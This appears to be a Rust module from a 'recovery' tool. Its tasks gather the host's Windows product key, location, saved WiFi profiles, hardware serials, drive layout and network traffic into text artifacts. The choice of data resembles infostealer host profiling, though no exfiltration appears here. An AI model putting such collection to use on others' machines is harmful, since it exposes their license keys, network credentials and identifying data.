use crate::recovery::{
    context::RecoveryContext,
    helpers::{hardware as hardware_helpers, network as network_helpers},
    output::write_text_artifact,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use reqwest::Client;
use std::fmt::Write;
use std::sync::Arc;
use tracing::warn;

pub fn hardware_tasks(_ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![
        Arc::new(HardwareSnapshotTask),
        Arc::new(HardwareDriveTask),
        Arc::new(NetworkTrafficTask),
    ]
}

struct HardwareSnapshotTask;

#[async_trait]
impl RecoveryTask for HardwareSnapshotTask {
    fn label(&self) -> String {
        "Hardware Snapshot".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let summary = gather_hardware_snapshot().await;
        let artifact = write_text_artifact(
            ctx,
            self.category(),
            &self.label(),
            "hardware-info.txt",
            &summary,
        )
        .await?;

        Ok(vec![artifact])
    }
}

struct HardwareDriveTask;

#[async_trait]
impl RecoveryTask for HardwareDriveTask {
    fn label(&self) -> String {
        "Storage Details".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let summary = gather_drive_info().await;
        let artifact = write_text_artifact(
            ctx,
            self.category(),
            &self.label(),
            "harddrives.txt",
            &summary,
        )
        .await?;

        Ok(vec![artifact])
    }
}

struct NetworkTrafficTask;

#[async_trait]
impl RecoveryTask for NetworkTrafficTask {
    fn label(&self) -> String {
        "Network Traffic".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::System
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let summary = gather_network_traffic().await;
        let artifact = write_text_artifact(
            ctx,
            self.category(),
            &self.label(),
            "network-traffic.txt",
            &summary,
        )
        .await?;

        Ok(vec![artifact])
    }
}

async fn gather_hardware_snapshot() -> String {
    let client = Client::builder()
        .timeout(std::time::Duration::from_secs(10))
        .build()
        .unwrap_or_else(|_| Client::new());

    let snapshot = hardware_helpers::gather_snapshot(&client).await;

    let mut builder = String::new();
    writeln!(builder, "Operating System:\n{}", snapshot.operating_system).ok();
    writeln!(builder, "\nLocation:\n{}", snapshot.location).ok();
    writeln!(builder, "\nWindows Product Key:\n{}", snapshot.product_key).ok();
    writeln!(builder, "\nBIOS Version:\n{}", snapshot.bios_version).ok();
    writeln!(builder, "\nProcessor ID:\n{}", snapshot.processor_id).ok();
    writeln!(
        builder,
        "\nMotherboard Serial:\n{}",
        snapshot.motherboard_serial
    )
    .ok();
    writeln!(
        builder,
        "\nTotal Physical Memory:\n{}",
        snapshot.total_physical_memory
    )
    .ok();
    writeln!(builder, "\nGraphics:\n{}", snapshot.graphics_card).ok();
    writeln!(
        builder,
        "\nSaved WIFI Profiles:\n{}",
        snapshot.wifi_profiles
    )
    .ok();
    writeln!(builder, "\nSystem Uptime:\n{}", snapshot.system_uptime).ok();
    writeln!(
        builder,
        "\nNetwork Adapters:\n{}",
        snapshot.network_adapters
    )
    .ok();

    builder
}

async fn gather_drive_info() -> String {
    let drive_details = hardware_helpers::gather_drive_info().await;
    let mut builder = String::new();
    writeln!(builder, "Disk Drives:\n{}", drive_details.disk_drives).ok();
    writeln!(builder, "\nPartitions:\n{}", drive_details.partitions).ok();
    writeln!(builder, "\nLogical Disks:\n{}", drive_details.logical_disks).ok();
    builder
}

async fn gather_network_traffic() -> String {
    match network_helpers::gather_network_traffic().await {
        Ok(adapters) => {
            let mut builder = String::new();
            writeln!(builder, "Network Traffic Summary:").ok();
            for adapter in adapters {
                writeln!(builder, "Interface: {}", adapter.name).ok();
                writeln!(builder, "  Received Bytes: {:?}", adapter.received_bytes).ok();
                writeln!(builder, "  Sent Bytes: {:?}\n", adapter.transmitted_bytes).ok();
            }
            builder
        }
        Err(err) => {
            warn!(error=?err, "failed to capture network traffic");
            "Network traffic statistics unavailable".to_string()
        }
    }
}
